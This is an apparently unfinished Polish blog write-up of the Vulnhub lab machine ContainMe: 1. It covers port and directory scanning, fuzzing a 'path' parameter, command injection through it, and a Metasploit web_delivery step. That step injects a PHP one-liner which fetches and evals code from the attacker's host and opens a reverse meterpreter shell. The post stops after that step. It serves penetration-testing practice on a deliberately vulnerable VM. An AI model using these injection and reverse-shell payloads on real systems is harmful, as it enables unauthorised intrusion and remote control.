---
title: "ContainMe: 1 - editing"
excerpt: " "
comments: true
categories:
  - Hacking
tags:
  - Hacking
  - Vulnhub
header:
  overlay_image: /assets/images/pasek-hack.png
gallery1:
  - url: /assets/images/hacking/2021/08/01.jpg
    image_path: /assets/images/hacking/2021/08/01.jpg
gallery2_3:
  - url: /assets/images/hacking/2021/08/02.png
    image_path: /assets/images/hacking/2021/08/02.png
  - url: /assets/images/hacking/2021/08/03.png
    image_path: /assets/images/hacking/2021/08/03.png
gallery4:    
  - url: /assets/images/hacking/2021/08/04.png
    image_path: /assets/images/hacking/2021/08/04.png
gallery5:
  - url: /assets/images/hacking/2021/08/05.png
    image_path: /assets/images/hacking/2021/08/05.png
gallery6:
  - url: /assets/images/hacking/2021/08/06.png
    image_path: /assets/images/hacking/2021/08/06.png
---
# Wstęp
test
{: .text-justify}
## Zaczynamy
Standardowo na początku użyjemy <mark>Nmap</mark>-a w <mark>Metasploicie</mark>
{: .text-justify}
```console
db_nmap -A -p- 172.16.1.218

172.16.1.218  22    tcp    ssh           open   OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 Ubuntu Linux; protocol 2.0
172.16.1.218  80    tcp    http          open   Apache httpd 2.4.29 (Ubuntu)
172.16.1.218  2222  tcp    ethernetip-1  open
172.16.1.218  8022  tcp    ssh           open   OpenSSH 7.7p1 Ubuntu 4ppa1+obfuscated Ubuntu Linux; protocol 2.0 
```
</div>
## WWW
Widzimy trochę portów. Dwa z nich to **SSH**. Tym zajmiemy się później. Na początku jak zwykle pójdzie **WWW**. **Dirb** to nam pokazał:
{: .text-justify}
```console
root@kali:/home/szikers# dirb http://172.16.1.218/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Wed Aug 11 12:08:08 2021
URL_BASE: http://172.16.1.218/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://172.16.1.218/ ----
+ http://172.16.1.218/index.html (CODE:200|SIZE:10918)
+ http://172.16.1.218/index.php (CODE:200|SIZE:329)
+ http://172.16.1.218/info.php (CODE:200|SIZE:69012)
```
To wystarczy, więcej nie trzeba skanować. W **index.html** jest zwykła strona **Debiana**. W **info.php** jest informacja o serwerze i PHP i dowiadujemy się, że strona stoi na kontenerze LXD.
{: .text-justify}
<div class="notice--primary" markdown="1">
http://172.16.1.218/info.php
{% include gallery id="gallery1"  %}
</div>
**Index.php** prawdopodobnie uruchamia nam komendę listującą katalog. Poniżej strona z kodem i bez kodu. Jest również wskazówka:
{: .text-justify}
<div class="notice--primary" markdown="1">
http://172.16.1.218/index.php
{% include gallery id="gallery2_3"  %}
</div>
"Poffuzujemy" trochę i sprawdźmy czy **http://172.16.1.218/index.php** inaczej się zachowa z parametrem.
{: .text-justify}
```console
wfuzz  --filter 'h!=329' -c -w /usr/share/dirb/wordlists/common.txt  http://172.16.1.218/index.php?FUZZ=a

root@kali:/home/szikers/Containme-1# wfuzz  --filter 'h!=329' -c -w /usr/share/dirb/wordlists/common.txt  http://172.16.1.218/index.php?FUZZ=a
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.16.1.218/index.php?FUZZ=a
Total requests: 4614

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000002874:   200        10 L     13 W       79 Ch       "path"
```
Parametr **path** ma inną ilość znaków niż inne. **PHP** odwołuje się do **path** przez metodę **GET**. Zobaczmy czy się da wyświetlić jakiś katalog:
{: .text-justify}
<div class="notice--primary" markdown="1">
http://172.16.1.218/index.php?path=/
```console
	total 72K
drwxr-xr-x  22 root   root    4.0K Jul 15 09:33 .
drwxr-xr-x  22 root   root    4.0K Jul 15 09:33 ..
drwxr-xr-x   2 root   root    4.0K Jul 30 04:28 bin
drwxr-xr-x   2 root   root    4.0K Jun 29 03:07 boot
drwxr-xr-x   8 root   root     480 Aug 11 08:00 dev
drwxr-xr-x  81 root   root    4.0K Aug 11 14:59 etc
drwxr-xr-x   3 root   root    4.0K Jul 19 15:03 home
drwxr-xr-x  16 root   root    4.0K Jun 29 03:04 lib
drwxr-xr-x   2 root   root    4.0K Jun 29 03:03 lib64
drwxr-xr-x   2 root   root    4.0K Jun 29 03:01 media
drwxr-xr-x   2 root   root    4.0K Jun 29 03:01 mnt
drwxr-xr-x   2 root   root    4.0K Jun 29 03:01 opt
dr-xr-xr-x 123 nobody nogroup    0 Aug 11 08:00 proc
drwx------   6 root   root    4.0K Aug 11 10:15 root
drwxr-xr-x  17 root   root     660 Aug 12 06:26 run
drwxr-xr-x   2 root   root    4.0K Jul 30 04:36 sbin
drwxr-xr-x   2 root   root    4.0K Jul 14 22:03 snap
drwxr-xr-x   2 root   root    4.0K Jun 29 03:01 srv
dr-xr-xr-x  13 nobody nogroup    0 Aug 11 08:23 sys
drwxrwxrwt   8 root   root    4.0K Aug 12 13:09 tmp
drwxr-xr-x  11 root   root    4.0K Jun 29 03:03 usr
drwxr-xr-x  14 root   root    4.0K Jul 15 17:11 var	
```
</div>
Możemy wyświetlić katalog. Sprawdźmy czy jest podatność na **Code injection**.
{: .text-justify}
<div class="notice--primary" markdown="1">
http://172.16.1.218/index.php?path=/;echo;id
```console
	total 72K
drwxr-xr-x  22 root   root    4.0K Jul 15 09:33 .
drwxr-xr-x  22 root   root    4.0K Jul 15 09:33 ..
drwxr-xr-x   2 root   root    4.0K Jul 30 04:28 bin
drwxr-xr-x   2 root   root    4.0K Jun 29 03:07 boot
drwxr-xr-x   8 root   root     480 Aug 11 08:00 dev
drwxr-xr-x  81 root   root    4.0K Aug 11 14:59 etc
drwxr-xr-x   3 root   root    4.0K Jul 19 15:03 home
drwxr-xr-x  16 root   root    4.0K Jun 29 03:04 lib
drwxr-xr-x   2 root   root    4.0K Jun 29 03:03 lib64
drwxr-xr-x   2 root   root    4.0K Jun 29 03:01 media
drwxr-xr-x   2 root   root    4.0K Jun 29 03:01 mnt
drwxr-xr-x   2 root   root    4.0K Jun 29 03:01 opt
dr-xr-xr-x 123 nobody nogroup    0 Aug 11 08:00 proc
drwx------   6 root   root    4.0K Aug 11 10:15 root
drwxr-xr-x  17 root   root     660 Aug 12 06:26 run
drwxr-xr-x   2 root   root    4.0K Jul 30 04:36 sbin
drwxr-xr-x   2 root   root    4.0K Jul 14 22:03 snap
drwxr-xr-x   2 root   root    4.0K Jun 29 03:01 srv
dr-xr-xr-x  13 nobody nogroup    0 Aug 11 08:23 sys
drwxrwxrwt   8 root   root    4.0K Aug 12 13:09 tmp
drwxr-xr-x  11 root   root    4.0K Jun 29 03:03 usr
drwxr-xr-x  14 root   root    4.0K Jul 15 17:11 var

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
</div>
Maszyna jest podatna. Czas tam wejść. Do tego użyjemy **Metasploita**:
{: .text-justify}
```console
msf6 exploit(multi/script/web_delivery) > use exploit/multi/script/web_delivery
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set lhost eth0
lhost => eth0
msf6 exploit(multi/script/web_delivery) > set target PHP
target => PHP
msf6 exploit(multi/script/web_delivery) > run -j
[*] Exploit running as background job 2.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 172.16.1.10:4444
msf6 exploit(multi/script/web_delivery) > [*] Using URL: http://0.0.0.0:8080/xIXYouzGVsN
[*] Local IP: http://172.16.1.10:8080/xIXYouzGVsN
[*] Server started.
[*] Run the following command on the target machine:
php -d allow_url_fopen=true -r "eval(file_get_contents('http://172.16.1.10:8080/xIXYouzGVsN', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
```
<div class="notice--primary" markdown="1">Należy kod, co poda nam Metasploit wrzucic jako parametr w linku. W moim wypadku jest taki. U was zapewn będzie inny:
php -d allow_url_fopen=true -r "eval(file_get_contents('http://172.16.1.10:8080/xIXYouzGVsN', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
```bash
http://172.16.1.218/index.php?path=/;php -d allow_url_fopen=true -r "eval(file_get_contents('http://172.16.1.10:8080/xIXYouzGVsN', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
```
<div>
